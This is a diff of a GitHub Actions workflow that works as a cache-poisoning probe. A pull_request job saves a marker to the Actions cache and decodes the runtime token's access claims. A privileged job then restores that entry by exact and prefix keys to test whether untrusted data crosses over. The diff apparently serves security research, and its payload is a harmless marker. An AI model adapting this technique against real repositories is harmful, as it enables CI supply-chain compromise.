@@ -5,32 +5,50 @@ on:
     branches: [main]
   pull_request:
   pull_request_target:
-  issue_comment:
-  issues:
-  watch:
-    types: [started]
-  fork:
-  create:
-  label:
-  milestone:
-  release:
-  gollum:
-  discussion:
-  discussion_comment:
-  project_card:
-  status:
 jobs:
-  screen:
+  poison:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          mkdir -p dtpayload
+          echo "POISONED-BY-UNTRUSTED-FORK actor=$GITHUB_ACTOR run=$GITHUB_RUN_ID" > dtpayload/marker.txt
+          cat dtpayload/marker.txt
+      - uses: actions/cache/save@v4
+        with:
+          path: dtpayload
+          key: dtpoison-fixedkey-v1
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const p = JSON.parse(Buffer.from(process.env.ACTIONS_RUNTIME_TOKEN.split('.')[1],'base64').toString());
+            core.info('ARM WRITER ac=' + JSON.stringify(p.ac));
+  consume:
+    if: github.event_name != 'pull_request'
     runs-on: ubuntu-latest
     steps:
       - uses: actions/github-script@v7
         with:
           script: |
-            const t = process.env.ACTIONS_RUNTIME_TOKEN;
-            const p = JSON.parse(Buffer.from(t.split('.')[1],'base64').toString());
-            const ac = p.ac ? JSON.parse(p.ac) : null;
-            const w = (ac||[]).filter(s => (s.Permission & 2) !== 0).map(s => s.Scope);
-            core.info('ARM event=' + process.env.GITHUB_EVENT_NAME +
-                      ' actor=' + process.env.GITHUB_ACTOR + ' ref=' + process.env.GITHUB_REF);
-            core.info('ARM ac=' + JSON.stringify(p.ac));
-            core.info('ARM WRITABLE_SCOPES=' + JSON.stringify(w));
+            const p = JSON.parse(Buffer.from(process.env.ACTIONS_RUNTIME_TOKEN.split('.')[1],'base64').toString());
+            core.info('ARM CONSUMER event=' + process.env.GITHUB_EVENT_NAME + ' ac=' + JSON.stringify(p.ac));
+      - id: exact
+        uses: actions/cache/restore@v4
+        with:
+          path: dtpayload
+          key: dtpoison-fixedkey-v1
+      - id: prefix
+        uses: actions/cache/restore@v4
+        with:
+          path: dtpayload
+          key: dtpoison-nonexistent-key-zzz
+          restore-keys: |
+            dtpoison-
+      - run: |
+          echo "ARM RESTORE exact_hit=${{ steps.exact.outputs.cache-hit }} matched=${{ steps.exact.outputs.cache-matched-key }}"
+          echo "ARM RESTORE prefix_hit=${{ steps.prefix.outputs.cache-hit }} matched=${{ steps.prefix.outputs.cache-matched-key }}"
+          if [ -f dtpayload/marker.txt ]; then
+            echo "ARM CROSSING=YES  PRIVILEGED JOB RESTORED THE UNTRUSTED ENTRY:"; cat dtpayload/marker.txt
+          else
+            echo "ARM CROSSING=NO   no payload materialised in the privileged job"
+          fi
